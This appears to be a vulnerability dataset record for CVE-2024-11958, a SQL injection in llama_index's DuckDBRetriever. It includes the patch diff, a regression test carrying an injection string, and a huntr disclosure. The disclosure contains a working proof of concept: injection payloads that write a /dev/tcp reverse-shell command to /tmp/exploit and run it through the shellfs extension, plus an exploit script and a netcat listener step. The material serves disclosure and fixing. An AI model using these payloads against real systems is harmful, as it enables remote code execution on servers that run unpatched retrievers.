{
    "CVE-2024-11958": {
        "published_date": "2025-03-20T10:10:46.492Z",
        "patch_commits": [
            {
                "url": "https://github.com/run-llama/llama_index/commit/35bd221e948e40458052d30c6ef2779bc965b6d0",
                "content": "fix: use prepared statement in DuckDBRetriever (#17092)\n\nFilename: llama-index-integrations/retrievers/llama-index-retrievers-duckdb-retriever/llama_index/retrievers/duckdb_retriever/base.py:\n```\n@@ -2,13 +2,13 @@\nimport os\n from typing import List, Optional\n \n+import duckdb\n from llama_index.core.base.base_retriever import BaseRetriever\n from llama_index.core.callbacks.base import CallbackManager\n from llama_index.core.constants import DEFAULT_SIMILARITY_TOP_K\n-from llama_index.core.schema import TextNode, NodeWithScore, QueryBundle\n+from llama_index.core.schema import NodeWithScore, QueryBundle, TextNode\n \n logger = logging.getLogger(__name__)\n-import_err_msg = \"`duckdb` package not found, please run `pip install duckdb`\"\n \n \n class DuckDBLocalContext:\n\n@@ -18,19 +18,13 @@\ndef __init__(self, database_path: str):\n         self._home_dir = os.path.expanduser(\"~\")\n \n     def __enter__(self) -> \"duckdb.DuckDBPyConnection\":\n-        try:\n-            import duckdb\n-        except ImportError:\n-            raise ImportError(import_err_msg)\n-\n-        if not os.path.exists(os.path.dirname(self.database_path)):\n+        if self.database_path != \":memory:\" and not os.path.exists(\n+            os.path.dirname(self.database_path)\n+        ):\n             raise ValueError(\n                 f\"Directory {os.path.dirname(self.database_path)} does not exist.\"\n             )\n \n-        # if not os.path.isfile(self.database_path):\n-        #     raise ValueError(f\"Database path {self.database_path} is not a valid file.\")\n-\n         self._conn = duckdb.connect(self.database_path)\n         self._conn.execute(f\"SET home_directory='{self._home_dir}';\")\n\n@@ -40,28 +34,26 @@\ndef __enter__(self) -> \"duckdb.DuckDBPyConnection\":\n         return self._conn\n \n     def __exit__(self, exc_type, exc_val, exc_tb) -> None:\n-        self._conn.close()\n-\n         if self._conn:\n             self._conn.close()\n \n \n class DuckDBRetriever(BaseRetriever):\n     def __init__(\n         self,\n-        database_name: Optional[str] = \":memory:\",\n-        table_name: Optional[str] = \"documents\",\n-        text_search_config: Optional[dict] = {\n+        database_name: str = \":memory:\",\n+        table_name: str = \"documents\",\n+        text_search_config: dict = {\n             \"stemmer\": \"english\",\n             \"stopwords\": \"english\",\n             \"ignore\": r\"(\\\\.|[^a-z])+\",\n             \"strip_accents\": True,\n             \"lower\": True,\n             \"overwrite\": True,\n         },\n-        persist_dir: Optional[str] = \"./storage\",\n-        node_id_column: Optional[str] = \"node_id\",\n-        text_column: Optional[str] = \"text\",\n+        persist_dir: str = \"./storage\",\n+        node_id_column: str = \"node_id\",\n+        text_column: str = \"text\",\n         # TODO: Add more options for FTS index creation\n         similarity_top_k: int = DEFAULT_SIMILARITY_TOP_K,\n         callback_manager: Optional[CallbackManager] = None,\n\n@@ -102,15 +94,15 @@\ndef _retrieve(self, query_bundle: QueryBundle) -> List[NodeWithScore]:\n         query = query_bundle.query_str\n         sql = f\"\"\"\n                 SELECT\n-                    fts_main_{self._table_name}.match_bm25({self._node_id_column}, '{query}') AS score,\n+                    fts_main_{self._table_name}.match_bm25({self._node_id_column}, ?) AS score,\n                     {self._node_id_column}, {self._text_column}\n                 FROM {self._table_name}\n                 WHERE score IS NOT NULL\n                 ORDER BY score DESC\n                 LIMIT {self._similarity_top_k};\n             \"\"\"\n         with DuckDBLocalContext(self._database_path) as conn:\n-            query_result = conn.execute(sql).fetchall()\n+            query_result = conn.execute(sql, [query]).fetchall()\n         # Convert query result to NodeWithScore objects\n         retrieve_nodes = []\n         for row in query_result:\n```\n\nFilename: llama-index-integrations/retrievers/llama-index-retrievers-duckdb-retriever/pyproject.toml:\n```\n@@ -27,12 +27,12 @@\nexclude = [\"**/BUILD\"]\n license = \"MIT\"\n name = \"llama-index-retrievers-duckdb-retriever\"\n readme = \"README.md\"\n-version = \"0.3.0\"\n+version = \"0.4.0\"\n \n [tool.poetry.dependencies]\n python = \">=3.9,<4.0\"\n-pymongo = \"^4.6.1\"\n llama-index-core = \"^0.12.0\"\n+duckdb = \"^1.1.3\"\n \n [tool.poetry.group.dev.dependencies]\n ipython = \"8.10.0\"\n```\n\nFilename: llama-index-integrations/retrievers/llama-index-retrievers-duckdb-retriever/tests/test_retrievers_bm25_retriever.py:\n```\n@@ -1,3 +1,4 @@\n+import duckdb\n from llama_index.core.base.base_retriever import BaseRetriever\n from llama_index.retrievers.duckdb_retriever.base import (\n     DuckDBRetriever,\n\n@@ -7,3 +8,16 @@\ndef test_class():\n     names_of_base_classes = [b.__name__ for b in DuckDBRetriever.__mro__]\n     assert BaseRetriever.__name__ in names_of_base_classes\n+\n+\n+def test_injection(tmp_path):\n+    db = tmp_path / \"test.db\"\n+    with duckdb.connect(db) as conn:\n+        conn.sql(\n+            \"CREATE TABLE documents (node_id VARCHAR, text VARCHAR, author VARCHAR, doc_version INTEGER);\"\n+        )\n+    r = DuckDBRetriever(database_name=db)\n+    nodes = r.retrieve(\n+        \"life') AS score, node_id, text FROM documents UNION SELECT '1500', '!', concat('life', version()) UNION SELECT concat('0\"\n+    )\n+    assert not nodes\n```"
            }
        ],
        "sw_version": "v0.3.6",
        "sw_version_wget": "https://github.com/run-llama/llama_index/archive/refs/tags/v0.3.6.zip",
        "description": "A SQL injection vulnerability exists in the `duckdb_retriever` component of the run-llama/llama_index repository, specifically in the latest version. The vulnerability arises from the construction of SQL queries without using prepared statements, allowing an attacker to inject arbitrary SQL code. This can lead to remote code execution (RCE) by installing the shellfs extension and executing malicious commands.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nA SQL Injection in DuckDB via prompt can lead to RCE in run-llama/llama_index\nValid\nReported on Nov 25th 2024\nTarget\nLink\nDescription\nsql = f\"\"\"\n        SELECT\n            fts_main_{self._table_name}.match_bm25({self._node_id_column}, '{query}') AS score,\n            {self._node_id_column}, {self._text_column}\n        FROM {self._table_name}\n        WHERE score IS NOT NULL\n        ORDER BY score DESC\n        LIMIT {self._similarity_top_k};\n    \"\"\"\nThe duckdb_retriever performs \"search using string\" and \"calculate a relevance score\" based on the above SQL query that utilizes the Full-Text Search (FTS) extension in DuckDB. There is potential SQL injection point in this code due to the lack of a prepared statement. An attacker can achive remote code execution via SQL injection by using installing the shellfs extention.\nFor a simple proof of concept for sql injection, You can inputs life') AS score, node_id, text FROM documents UNION SELECT '1500', '!', concat('life', version()) UNION SELECT concat('0 as query, the SQL query is modified as shown below. This allows DuckDB to execute malicious SQL query such as SELECT '1500', '!', concat('life', version()).\nsql = f\"\"\"\n        SELECT\n            fts_main_{self._table_name}.match_bm25({self._node_id_column}, 'life') AS score, node_id, text FROM documents UNION SELECT '1500', '!', concat('life', version()) UNION SELECT concat('0') AS score,\n            {self._node_id_column}, {self._text_column}\n        FROM {self._table_name}\n        WHERE score IS NOT NULL\n        ORDER BY score DESC\n        LIMIT {self._similarity_top_k};\n    \"\"\"\nPoc\nFirst, the attacker can create new file(/tmp/exploit), by using following payload. and the file contains the shell command sh -i >& /dev/tcp/0.0.0.0/4444 0>&1.\ntest') as score, node_id, text from documents; COPY (SELECT 'sh -i >& /dev/tcp/0.0.0.0/4444 0>&1') TO '/tmp/exploit'; select concat('0\nNext step is that the attacker has to inject SQL to install the shellfs extention which lead to executing the /tmp/exploit file using the 'shellfs' extension. Since the 'shellfs' extension in DuckDB allows shell commands for input and output, an attacker can open a reverse shell(in this case /tmp/expoit).\ntest') as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv('bash /tmp/exploit |'); select concat('0\n# requirements: duckdb, llama-index-retrievers-duckdb-retriever\n\nimport os\n\nimport duckdb\nfrom llama_index.retrievers.duckdb_retriever import DuckDBRetriever\n\n\ndef create_database(file: str):\n    if os.path.exists(file):\n        os.remove(file)\n\n    with duckdb.connect(file) as conn:\n        conn.sql(\n            \"CREATE TABLE documents (node_id VARCHAR, text VARCHAR, author VARCHAR, doc_version INTEGER);\"\n        )\n        conn.sql(\n            \"INSERT INTO documents VALUES ('doc1', 'The cat is pretty.', 'Alice', 3);\"\n        )\n        conn.sql(\"INSERT INTO documents VALUES ('doc2', 'The dog is cute.', 'Bob', 2);\")\n\n\nif __name__ == \"__main__\":\n    os.makedirs(\"./storage\", exist_ok=True)\n\n    create_database(file=\"./storage/testduck.db\")\n    retriever = DuckDBRetriever(database_name=\"testduck.db\", table_name=\"documents\")\n\n    print(\"=== Normal Case ===\")\n    nodes = retriever.retrieve(\"Cat is cute?\")\n\n    for n in nodes:\n        print(n.get_content())\n\n    print(\"=== File Write ===\")\n    nodes = retriever.retrieve(\n               \"test') as score, node_id, text from documents; COPY (SELECT 'sh -i >& /dev/tcp/0.0.0.0/4444 0>&1') TO '/tmp/exploit'; select concat('0\"\n    )\n\n    for n in nodes:\n        print(n.get_content())\n    \n    print(\"=== Reverse Shell ===\")\n    nodes = retriever.retrieve(\n               \"test') as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv('bash /tmp/exploit |'); select concat('0\"\n    )\n\n    for n in nodes:\n        print(n.get_content())\nFor this senario, The attacker should set up a Netcat listener on port 4444 in his local PC, with following command nc -lvnp 4444 , and by executing the code above, An attacker is able to get a reverse shell.\nSetting up a simple test environment.\nI made a simple web server using DuckDBRetriever.\nIf the attacker put test') as score, node_id, text from documents; COPY (SELECT 'sh -i >& /dev/tcp/<Attacker_IP>/<PORT> 0>&1') TO '/tmp/exploit'; select concat('0 and test') as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv('bash /tmp/exploit |'); select concat('0 sequentially, attacker can get reverse shell for the server.\n# requirements: duckdb, llama-index-retrievers-duckdb-retriever\n\nimport os\nfrom flask import Flask, request, jsonify, render_template\nimport duckdb\nfrom llama_index.retrievers.duckdb_retriever import DuckDBRetriever\n\napp = Flask(__name__)\ndef create_database(file: str):\n    if os.path.exists(file):\n        os.remove(file)\n\n    with duckdb.connect(file) as conn:\n        conn.sql(\n            \"CREATE TABLE documents (node_id VARCHAR, text VARCHAR, author VARCHAR, doc_version INTEGER);\"\n        )\n        conn.sql(\n            \"INSERT INTO documents VALUES ('doc1', 'The cat is pretty.', 'Alice', 3);\"\n        )\n        conn.sql(\"INSERT INTO documents VALUES ('doc2', 'The dog is cute.', 'Bob', 2);\")\n\nos.makedirs(\"./storage\", exist_ok=True)\nglobal retriever\ncreate_database(file=\"./storage/testduck.db\")\nretriever = DuckDBRetriever(database_name=\"testduck.db\", table_name=\"documents\")\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\n@app.route('/ask', methods=['POST'])\ndef ask():\n    global retriever\n    data = request.get_json()\n    question = data.get('question')\n\n    response = retriever.retrieve(question)\n    res = []\n    for r in response:\n        res.append(r.get_content())\n    print(res)\n    return jsonify({'answer': res})\n\nif __name__ == '__main__':\n    app.run(port=7000)\n<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Ask a Question</title>\n</head>\n<body>\n    <h1>Ask a Question</h1>\n    <form id=\"questionForm\">\n        <input type=\"text\" id=\"question\" placeholder=\"Enter your question\" required>\n        <button type=\"submit\">Ask</button>\n    </form>\n    <div id=\"answer\"></div>\n\n    <script>\n        document.getElementById('questionForm').addEventListener('submit', async function(event) {\n        event.preventDefault();\n        const question = document.getElementById('question').value;\n\n        const response = await fetch('/ask', {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({ question: question })\n        });\n\n        const data = await response.json();\n        console.log(data.answer);\n        document.getElementById('answer').innerText = \"Answer: \" + (data.answer || \"No answer found\");\n\n    });\n    </script>\n</body>\n</html>\nPoc video\npoc video\nImpact\nRce attack is possible through prompt.\nWe are processing your report and will contact therun-llama/llama_index team within 24 hours.6 months ago\nA GitHub Issue asking the maintainers to create a SECURITY.md exists6 months ago\nhuntr-helper\ncommented6 months ago\nAdmin\nThis report was determined to possibly be out of scope or have a high likelyhood of being marked as informative.\nPlease review your report and the Participation Guidelines.\nThese are the specific guidelines this report is in possible violation of:\nVulnerabilities in code used for tests or example purposes.\nMassimiliano Pippi validated this vulnerability6 months ago\nhttps://github.com/run-llama/llama_index/pull/17092\nlife-team2024has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-11958assigned to this report.6 months ago\nMassimiliano Pippimarked this as fixedin 0.4.0with commit35bd226 months ago\nMassimiliano Pippihas been awarded the fix bounty\nWe have notified the run-llama/llama_index maintainers about this report in their weekly follow-up3 months ago\nWe have sent a warning to the run-llama/llama_index team to inform them that this report will be published in 48 hours3 months ago\nThis vulnerability has now been published3 months ago\nCVE-2024-11958has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-11958\n(Published)\nVulnerability Type\nCWE-89: SQL Injection\nSeverity\nCritical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\nlatest\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$1500\nFix Bounty\n$375\nFound by\nlife-team2024\n@life-team2024\nMIDDLEWEIGHT\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes POC code and detailed instructions to reproduce the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-89",
                "value": "CWE-89 Improper Neutralization of Special Elements used in an SQL Command"
            }
        ]
    }
}